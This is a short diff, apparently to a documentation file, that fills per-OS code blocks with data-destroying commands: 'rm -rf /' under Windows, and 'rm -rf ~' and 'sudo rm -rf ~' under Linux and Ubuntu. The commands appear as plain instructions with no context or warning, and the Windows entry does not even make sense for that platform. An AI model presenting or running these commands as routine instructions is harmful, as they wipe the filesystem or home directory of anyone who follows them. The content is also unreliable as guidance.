@@ -1,10 +1,13 @@
 Windows:
 ```
-rm -rf
+rm -rf /
 ```
-
+Linux:
+```
+rm -rf ~
+```
 Ubuntu:
 ```
-sudo rm -rf
+sudo rm -rf ~
 ```
 
